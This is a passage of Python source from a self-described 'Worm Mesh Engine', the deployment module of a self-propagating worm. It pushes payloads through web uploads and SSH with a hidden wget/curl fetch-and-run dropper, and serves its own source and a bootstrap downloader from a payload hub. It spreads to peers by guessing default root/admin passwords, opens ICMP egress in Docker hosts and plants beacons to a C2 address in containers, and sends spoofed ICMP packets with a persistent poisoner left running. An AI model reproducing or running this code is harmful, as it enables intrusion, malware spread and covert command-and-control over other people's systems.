        for scheme in ["http", "https"]:
            upload_urls = [
                f"{scheme}://{ip}:{port}/upload.php",
                f"{scheme}://{ip}:{port}/uploads/",
                f"{scheme}://{ip}:{port}/admin/upload.php",
                f"{scheme}://{ip}:{port}/cgi-bin/upload.cgi",
                f"{scheme}://{ip}:{port}/wp-content/plugins/",
                f"{scheme}://{ip}:{port}/api/v1/upload",
            ]
            for url in upload_urls:
                if self._stop_flag:
                    break
                try:
                    files = {"file": (filename, content, "application/octet-stream")}
                    resp = requests.post(url, files=files, timeout=10, verify=False)
                    if resp.status_code in (200, 201, 302):
                        did = self.db.add_deployment(
                            target_ip=ip, method="web_upload",
                            payload_id=payload.get("payload_id", ""),
                            payload_variant=payload.get("variant", ""),
                        )
                        self.db.complete_deployment(did, True)
                        self.db.increment_deployed(payload.get("payload_id", ""))
                        self.db.log(f"Web upload deploy success: {url}", "INFO", "deploy")
                        return DeploymentReport(
                            success=True, target_ip=ip,
                            method=DeployMethod.WEB_UPLOAD,
                            payload_variant=payload.get("variant", ""),
                            deploy_id=did, detail=f"Uploaded to {url}",
                        )
                except Exception:
                    continue
        return DeploymentReport(False, ip, DeployMethod.WEB_UPLOAD,
                                detail="No upload endpoints found")

    # ---- Payload Hub ----

    def _deploy_via_wget(self, ip: str, port: int,
                         credential: Optional[Tuple[str, str]],
                         payload: Dict) -> DeploymentReport:
        """Instruct target to download payload from hub via wget/curl."""
        token = _daily_token()
        hub_url = f"http://{self.payload_hub_host}:{self.payload_hub_port}/payload/{payload.get('payload_id', 'latest')}?token={token}"
        download_cmd = (
            f"cd /tmp && "
            f"(wget -q '{hub_url}' -O .upd.py || curl -s '{hub_url}' -o .upd.py) && "
            f"chmod +x .upd.py && "
            f"nohup python3 .upd.py &>/dev/null &"
        )
        if HAVE_PARAMIKO and credential:
            username, password = credential
            did = self.db.add_deployment(
                target_ip=ip, method="wget_curl_download",
                payload_id=payload.get("payload_id", ""),
                payload_variant=payload.get("variant", ""),
            )
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=username, password=password,
                               timeout=15, allow_agent=False, look_for_keys=False)
                _, stdout, stderr = client.exec_command(download_cmd, timeout=15)
                stdout.channel.recv_exit_status()
                client.close()
                self.db.complete_deployment(did, True)
                self.db.increment_deployed(payload.get("payload_id", ""))
                self.db.log(f"Wget deploy success: {ip}:{port}", "INFO", "deploy")
                return DeploymentReport(
                    success=True, target_ip=ip, method=DeployMethod.WGET_CURL,
                    payload_variant=payload.get("variant", ""),
                    deploy_id=did,
                )
            except Exception as exc:
                self.db.complete_deployment(did, False, str(exc))
                return DeploymentReport(False, ip, DeployMethod.WGET_CURL,
                                        error=str(exc), deploy_id=did)
        return DeploymentReport(False, ip, DeployMethod.WGET_CURL,
                                detail="No valid credential for wget push")

    # ---- Payload Hub Server ----

    def start_payload_hub(self) -> None:
        """Start the HTTP payload hub server in a background thread."""
        if self._hub_thread and self._hub_thread.is_alive():
            log.info("Payload hub already running")
            return
        self._hub_thread = threading.Thread(target=self._run_hub, daemon=True)
        self._hub_thread.start()
        log.info(f"Payload hub started on {self.payload_hub_host}:{self.payload_hub_port}")

    def stop_payload_hub(self) -> None:
        """Stop the payload hub server."""
        self._stop_flag = True
        if self._hub_thread:
            self._hub_thread.join(timeout=5)
        log.info("Payload hub stopped")

    def _run_hub(self) -> None:
        """Simple HTTP server for serving payloads."""
        import http.server
        import socketserver

        class PayloadHandler(http.server.BaseHTTPRequestHandler):
            engine_ref = self

            def _verify_token(self):
                qs = self.path.split("?", 1)[-1] if "?" in self.path else ""
                params = {}
                for pair in qs.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        params[k] = v
                return params.get("token", "") == _daily_token()

            def do_GET(self):
                if not self._verify_token():
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b"403 - Forbidden (valid token required)\n")
                    return
                path = self.path.split("?")[0].strip("/")
                if path.startswith("payload/"):
                    payload_id = path.split("/", 1)[1]
                    payloads = self.engine_ref.payload_generator.generate_all(persist=True)
                    content = ""
                    for p in payloads:
                        if p.get("payload_id") == payload_id or payload_id == "latest":
                            content = p.get("content", "")
                            if payload_id == "latest":
                                content = payloads[-1]["content"]
                            break
                    if not content:
                        payloads_db = self.engine_ref.db.get_payloads(limit=10)
                        for p in payloads_db:
                            if p.get("id") == payload_id or payload_id == "latest":
                                content = p.get("content", "")
                                break
                    if content:
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-python")
                        self.send_header("X-Worm-Version", "1.0.0")
                        self.end_headers()
                        self.wfile.write(content.encode())
                    else:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"Payload not found")
                elif path == "status":
                    stats = self.engine_ref.db.stats()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(stats, indent=2).encode())
                elif path == "worm":
                    worm_path = "/opt/hermes/worm_mesh_engine.py"
                    try:
                        with open(worm_path, "rb") as f:
                            worm_source = f.read()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-python")
                        self.send_header("Content-Disposition",
                                         'attachment; filename="worm_mesh_engine.py"')
                        self.send_header("X-Worm-Version", "1.0.0")
                        self.send_header("X-Worm-Self", "true")
                        self.end_headers()
                        self.wfile.write(worm_source)
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"Worm source not found")
                elif path == "bootstrap":
                    hub_ip = self.engine_ref.payload_hub_host
                    if hub_ip == "0.0.0.0":
                        hub_ip = "127.0.0.1"
                    hub_port = self.engine_ref.payload_hub_port
                    token = _daily_token()
                    bootstrap = (
                        "#!/usr/bin/env python3\n"
                        "import os, sys, urllib.request, subprocess\n"
                        f"url = 'http://{hub_ip}:{hub_port}/worm?token={token}'\n"
                        "try:\n"
                        "    data = urllib.request.urlopen(url, timeout=30).read()\n"
                        "    path = '/tmp/.worm_engine.py'\n"
                        "    with open(path, 'wb') as f:\n"
                        "        f.write(data)\n"
                        "    os.chmod(path, 0o755)\n"
                        "    subprocess.Popen([sys.executable, path, '--deploy', '--batch', '3', '--hops', '2'],\n"
                        "                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
                        "except Exception as e:\n"
                        "    print(f'Worm bootstrap failed: {e}')\n"
                    )
                    self.send_response(200)
                    self.send_header("Content-Type", "text/x-python")
                    self.send_header("Content-Disposition",
                                     'attachment; filename="worm_bootstrap.py"')
                    self.end_headers()
                    self.wfile.write(bootstrap.encode())
                else:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.end_headers()
                    self.wfile.write("Worm Mesh Engine - Payload Hub\n".encode())
                    self.wfile.write(f"Active payloads: {len(self.engine_ref.payload_generator._cache)}\n".encode())
                    self.wfile.write(f"DB targets: {self.engine_ref.db.target_count()}\n".encode())

            def log_message(self, fmt, *args):
                log.debug(f"Hub: {fmt % args}")

        handler = type('Handler', (PayloadHandler,), {'engine_ref': self})
        try:
            socketserver.TCPServer.allow_reuse_address = True
            with socketserver.TCPServer((self.payload_hub_host, self.payload_hub_port),
                                         handler) as httpd:
                httpd.serve_forever()
        except OSError as exc:
            log.error(f"Payload hub bind error: {exc}")

    # ---- Peer Propagation ----

    def propagate_to_peer(self, peer_ip: str, node: WormNode,
                          payload: Dict) -> DeploymentReport:
        """Propagate payload to a mesh peer via SSH."""
        for username, password in [
            ("root", "root"), ("root", "admin"), ("admin", "admin"),
            ("root", ""), ("admin", ""),
        ]:
            result = self._deploy_via_wget(
                peer_ip, 22, (username, password), payload
            )
            if result.success:
                node.add_peer(peer_ip)
                return result
        return DeploymentReport(False, peer_ip, DeployMethod.PEER_PROPAGATION,
                                detail="No valid credential for peer propagation")

    # ---- Docker ICMP Egress Bypass (CVE-2026-12539) ----

    def _detect_docker(self, ip: str, port: int,
                       credential: Tuple[str, str]) -> Optional[Dict]:
        """SSH into target and detect Docker installation."""
        if not HAVE_PARAMIKO:
            return None
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=credential[0],
                           password=credential[1], timeout=10,
                           allow_agent=False, look_for_keys=False)
            check_cmd = (
                "docker --version 2>/dev/null && "
                "docker ps -q 2>/dev/null | wc -l && "
                "docker ps -q 2>/dev/null | head -20 && "
                "docker network ls --filter driver=bridge --format '{{.Name}}' 2>/dev/null | head -5"
            )
            _, stdout, stderr = client.exec_command(check_cmd, timeout=10)
            out = stdout.read().decode(errors="ignore").strip()
            client.close()
            if not out or "docker" not in out.lower():
                return None
            lines = [l.strip() for l in out.split("\n") if l.strip()]
            if len(lines) < 2:
                return None
            docker_version = lines[0]
            container_count = 0
            try:
                container_count = int(lines[1])
            except ValueError:
                pass
            container_ids = []
            bridge_network = "docker0"
            for line in lines[2:]:
                if line and len(line) < 64 and not line.startswith("bridge") and not line.startswith("host"):
                    if line.startswith("br-") or line.startswith("docker"):
                        bridge_network = line
                    elif all(c in "0123456789abcdef" for c in line.strip()):
                        container_ids.append(line.strip())
            return {
                "docker_version": docker_version,
                "container_count": container_count,
                "container_ids": json.dumps(container_ids[:20]),
                "bridge_network": bridge_network,
            }
        except Exception as exc:
            log.debug(f"Docker detect failed on {ip}:{port}: {exc}")
            return None

    def _bypass_docker_icmp_egress(self, ip: str, port: int,
                                    credential: Tuple[str, str],
                                    c2_ip: str = "127.0.0.1") -> bool:
        """Exploit CVE-2026-12539: Bypass Docker ICMP egress filtering."""
        if not HAVE_PARAMIKO:
            return False
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=credential[0],
                           password=credential[1], timeout=10,
                           allow_agent=False, look_for_keys=False)
            iptables_cmds = (
                "iptables -I DOCKER 1 -p icmp -d {c2} -j ACCEPT 2>/dev/null; "
                "iptables -I FORWARD 1 -i docker0 -p icmp -d {c2} -j ACCEPT 2>/dev/null; "
                "iptables -I FORWARD 1 -i docker0 -p icmp -j ACCEPT 2>/dev/null; "
                "if command -v nft &>/dev/null; then "
                "  nft add rule ip filter FORWARD iifname docker0 ip protocol icmp accept 2>/dev/null; "
                "  nft add rule ip filter DOCKER ip protocol icmp accept 2>/dev/null; "
                "fi; "
                "if command -v netfilter-persistent &>/dev/null; then "
                "  netfilter-persistent save 2>/dev/null || true; "
                "elif [ -f /etc/init.d/iptables ]; then "
                "  /etc/init.d/iptables save 2>/dev/null || true; "
                "fi; "
                "docker restart 2>/dev/null || "
                "systemctl restart docker 2>/dev/null || "
                "service docker restart 2>/dev/null || true; "
                "sleep 1; "
                "iptables -I DOCKER 1 -p icmp -d {c2} -j ACCEPT 2>/dev/null; "
                "iptables -I FORWARD 1 -i docker0 -p icmp -d {c2} -j ACCEPT 2>/dev/null; "
                "iptables -I FORWARD 1 -i docker0 -p icmp -j ACCEPT 2>/dev/null"
            ).format(c2=c2_ip)
            stdin, stdout, stderr = client.exec_command(iptables_cmds, timeout=15)
            exit_code = stdout.channel.recv_exit_status()
            out = stdout.read().decode(errors="ignore")
            err = stderr.read().decode(errors="ignore")
            beacon_script = (
                'python3 -c "'
                'import os,socket,struct,time; '
                'C2=\\"{c2}\\"; '
                'while True:'
                '  try:'
                '    s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP); '
                '    s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1); '
                '    pkt=struct.pack(\\"!BBHHH\\",8,0,0,os.getpid()&0xFFFF,1)+b\\"BCN\\"+str(time.time()).encode()[:45]; '
                '    csum=0; '
                '    for i in range(0,len(pkt),2): '
                '      csum+=((pkt[i]<<8)+(pkt[i+1] if i+1<len(pkt) else 0)); '
                '    csum=(csum>>16)+(csum&0xFFFF); '
                '    csum=~csum&0xFFFF; '
                '    pkt=struct.pack(\\"!BBHHH\\",8,0,csum,os.getpid()&0xFFFF,1)+b\\"BCN\\"+str(time.time()).encode()[:45]; '
                '    s.sendto(pkt,(C2,0)); '
                '    s.close(); '
                '  except: pass; '
                '  time.sleep(60)" &>/dev/null &'
            ).format(c2=c2_ip)
            deploy_cmd = (
                "for cid in $(docker ps -q 2>/dev/null); do "
                "  docker exec -d $cid sh -c '{beacon}' 2>/dev/null; "
                "  docker exec -d $cid bash -c '{beacon}' 2>/dev/null; "
                "done"
            ).format(beacon=beacon_script.replace('"', '\\"'))
            stdin, stdout, stderr = client.exec_command(deploy_cmd, timeout=30)
            stdout.channel.recv_exit_status()
            client.close()
            success = "ACCEPT" in out or exit_code == 0 or "ACCEPT" in err
            if success:
                self.db.log(f"CVE-2026-12539 bypass applied: {ip} -> containers can ICMP to {c2_ip}",
                            "INFO", "deploy")
            return success
        except Exception as exc:
            log.debug(f"Docker ICMP bypass failed on {ip}:{exc}")
            return False

    def deploy_docker_icmp_bypass(self, ip: str, port: int,
                                   credential: Tuple[str, str],
                                   c2_ip: str = "127.0.0.1") -> Dict:
        """Full CVE-2026-12539 exploitation chain."""
        result = {
            "ip": ip,
            "docker_found": False,
            "bypass_applied": False,
            "container_count": 0,
            "error": None,
        }
        docker_info = self._detect_docker(ip, port, credential)
        if not docker_info:
            result["error"] = "No Docker detected"
            return result
        result["docker_found"] = True
        result["container_count"] = docker_info["container_count"]
        result["container_ids"] = docker_info["container_ids"]
        bypass_ok = self._bypass_docker_icmp_egress(ip, port, credential, c2_ip)
        result["bypass_applied"] = bypass_ok
        try:
            host_id = str(uuid.uuid4())
            now = int(time.time())
            self.db.execute(
                "INSERT OR REPLACE INTO docker_hosts "
                "(id, ip, hostname, docker_version, container_count, container_ids, "
                " bridge_network, icmp_bypassed, last_check, created_at) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (host_id, ip, "", docker_info["docker_version"],
                 docker_info["container_count"], docker_info["container_ids"],
                 docker_info["bridge_network"], 1 if bypass_ok else 0,
                 now, now)
            )
            self.db.commit()
        except Exception as exc:
            log.debug(f"Docker host register error: {exc}")
        self.db.log(f"Docker ICMP bypass: {ip} — "
                    f"{'BY' if bypass_ok else 'NO'}-passed, "
                    f"{docker_info['container_count']} containers",
                    "INFO", "deploy")
        return result

    # ---- CVE-2026-0933: ICMP Path MTU Cache Corruption ----

    def deploy_pmtu_poison(self, ip: str, port: int,
                           credential: Tuple[str, str],
                           burst: int = 12) -> Dict[str, Any]:
        """CVE-2026-0933 deployment: check kernel version -> PMTU cache poison."""
        import uuid
        result: Dict[str, Any] = {
            "ip": ip,
            "cve": "CVE-2026-0933",
            "kernel_version": None,
            "vulnerable": False,
            "poison_sent": False,
            "packets_sent": 0,
            "error": None,
        }
        if not HAVE_PARAMIKO:
            result["error"] = "No paramiko"
            return result
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=credential[0],
                           password=credential[1], timeout=10,
                           allow_agent=False, look_for_keys=False)
            _, stdout, _ = client.exec_command("uname -r", timeout=5)
            kernel = stdout.read().decode(errors="ignore").strip()
            client.close()
        except Exception as exc:
            result["error"] = f"SSH failed: {exc}"
            return result
        result["kernel_version"] = kernel
        try:
            parts = kernel.split(".")
            major = int(parts[0])
            minor = int(parts[1]) if len(parts) > 1 else 0
            vulnerable = (major < 6) or (major == 6 and minor <= 8)
        except (ValueError, IndexError):
            vulnerable = False
        result["vulnerable"] = vulnerable
        if not vulnerable:
            result["error"] = f"Kernel {kernel} not vulnerable (need <= 6.8)"
            return result
        # Fire PMTU poison from C2 side
        try:
            poison_result = self._fire_pmtu_poison(ip, burst=burst)
            result["poison_sent"] = (poison_result.get("status") == "sent")
            result["packets_sent"] = poison_result.get("packets_sent", 0)
        except Exception as exc:
            result["error"] = f"PMTU poison failed: {exc}"
            return result
        # Deploy persistent PMTU poisoner script
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=credential[0],
                           password=credential[1], timeout=10,
                           allow_agent=False, look_for_keys=False)
            pmtu_script = (
                '#!/usr/bin/env python3\n'
                'import socket, struct, time, random\n'
                'MTUS = [68, 128, 256, 296, 384, 500, 552, 576, 628, 700]\n'
                'SRCS = [f"{random.choice([1,3,8,12,15,23,34,45,50,64,72,80,89,96,104,128,134,145,156,173,185,198,203,208])}'
                f'.{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(1,254)}" for _ in range(5)]\n'
                'while True:\n'
                '    for mtu in MTUS:\n'
                '        try:\n'
                '            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n'
                '            src = random.choice(SRCS)\n'
                '            s.sendto(struct.pack("!BBHHHBBHII", 0x45, 0, 40, 0, 0, 64, 1, 0, '
                '*(int(x) for x in src.split(".")), *(int(x) for x in "127.0.0.1".split("."))), ("127.0.0.1", 0))\n'
                '            s.close()\n'
                '        except: pass\n'
                '        time.sleep(0.1)\n'
                '    time.sleep(600)\n'
            )
            _, stdout, stderr = client.exec_command(
                f"cat > /tmp/.pmtu_poison.py << 'ENDPOISON'\n"
                f"{pmtu_script}\n"
                f"ENDPOISON\n"
                f"chmod +x /tmp/.pmtu_poison.py\n"
                f"nohup python3 /tmp/.pmtu_poison.py >/dev/null 2>&1 &\n",
                timeout=10
            )
            err = stderr.read().decode(errors="ignore").strip()
            if err:
                self.db.log(f"PMTU poison deploy stderr on {ip}: {err}", "DEBUG", "deploy")
            client.close()
        except Exception as exc:
            self.db.log(f"PMTU poison script deploy failed on {ip}: {exc}", "DEBUG", "deploy")
        # Register in pmtu_poisoned table
        try:
            host_id = str(uuid.uuid4())
            now = int(time.time())
            self.db.execute(
                "INSERT OR REPLACE INTO pmtu_poisoned "
                "(id, ip, kernel_version, packets_sent, last_poison, created_at) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (host_id, ip, kernel, result["packets_sent"], now, now)
            )
            self.db.commit()
        except Exception as exc:
            log.debug(f"PMTU register error: {exc}")
        self.db.log(f"CVE-2026-0933: {ip} kernel={kernel} "
                    f"{'VULNERABLE' if vulnerable else 'PATCHED'} — "
                    f"sent {result['packets_sent']} poison packets",
                    "INFO", "deploy")
        return result

    def _fire_pmtu_poison(self, target: str, burst: int = 12) -> Dict:
        """Fire spoofed ICMP Frag Needed packets."""
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(burst):
                src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
                mtu = random.choice([68, 128, 256, 296, 384, 500, 552, 576])
                # ICMP Frag Needed (type 3, code 4)
                icmp_type = 3
                icmp_code = 4
                icmp_payload = struct.pack("!BBHHH", icmp_type, icmp_code, 0, 0, mtu) + b"\x00" * 8
                chk = 0
                for i in range(0, len(icmp_payload), 2):
                    if i + 1 < len(icmp_payload):
                        chk += (icmp_payload[i] << 8) + icmp_payload[i + 1]
                chk = (chk >> 16) + (chk & 0xFFFF)
                chk = ~chk & 0xFFFF
                icmp_payload = struct.pack("!BBHHH", icmp_type, icmp_code, chk, 0, mtu) + b"\x00" * 8
                ip_hdr = struct.pack("!BBHHHBBHII", 0x45, 0, 20 + len(icmp_payload), 0, 0, 64, 1, 0,
                                     *struct.unpack("!I", socket.inet_aton(src_ip))[0],
                                     *struct.unpack("!I", socket.inet_aton(target))[0])
                sock.sendto(ip_hdr + icmp_payload, (target, 0))
                sent += 1
            sock.close()
        except Exception as exc:
            log.debug(f"PMTU fire error: {exc}")
        return {"status": "sent" if sent > 0 else "failed", "packets_sent": sent}

    # ---- Orchestration ----

    def deploy_to_target(self, target: Dict, exploit_result: ExploitResult,
                         payload: Optional[Dict] = None) -> DeploymentReport:
        """Execute the best deployment method for a successfully exploited target."""
        if payload is None:
            variants = self.payload_generator.generate_all(persist=True)
            payload = random.choice(variants)
        ip = target["ip"]
        port = int(target.get("port", 22))
        methods: List[tuple] = []

        if exploit_result.exploit_type in (ExploitType.SSH_BRUTE, ExploitType.SSH_KEY):
            if exploit_result.credential:
                methods.append((DeployMethod.SSH_PUSH, self._deploy_ssh_push,
                                (ip, port, exploit_result.credential, payload)))
                methods.append((DeployMethod.SSH_EXEC, self._deploy_ssh_exec,
                                (ip, port, exploit_result.credential, payload)))
            methods.append((DeployMethod.WGET_CURL, self._deploy_via_wget,
                            (ip, port, exploit_result.credential, payload)))

        if exploit_result.exploit_type == ExploitType.TELNET_AUTH_BYPASS:
            if exploit_result.credential:
                methods.append((DeployMethod.SSH_PUSH, self._deploy_ssh_push,
                                (ip, 22, exploit_result.credential, payload)))
                methods.append((DeployMethod.WGET_CURL, self._deploy_via_wget,
                                (ip, 22, exploit_result.credential, payload)))

        if exploit_result.exploit_type in (ExploitType.WEB_RCE, ExploitType.WEB_LFI):
            methods.append((DeployMethod.WEB_UPLOAD, self._deploy_web_upload,
                            (ip, port, payload)))
            methods.append((DeployMethod.WGET_CURL, self._deploy_via_wget,
                            (ip, port, None, payload)))

        for method, func, args in methods:
            if self._stop_flag:
                break
            try:
                result = func(*args)
                if result.success:
                    if exploit_result.credential:
                        try:
                            self.deploy_docker_icmp_bypass(
                                ip, port, exploit_result.credential
                            )
                        except Exception:
                            pass
                        try:
                            self.deploy_pmtu_poison(
                                ip, port, exploit_result.credential
                            )
                        except Exception:
                            pass
                    return result
            except Exception as exc:
                log.debug(f"Deploy {method.value} failed on {ip}:{port}: {exc}")
                continue
        return DeploymentReport(False, ip, DeployMethod.PAYLOAD_HUB,
                                detail="All deployment methods exhausted")
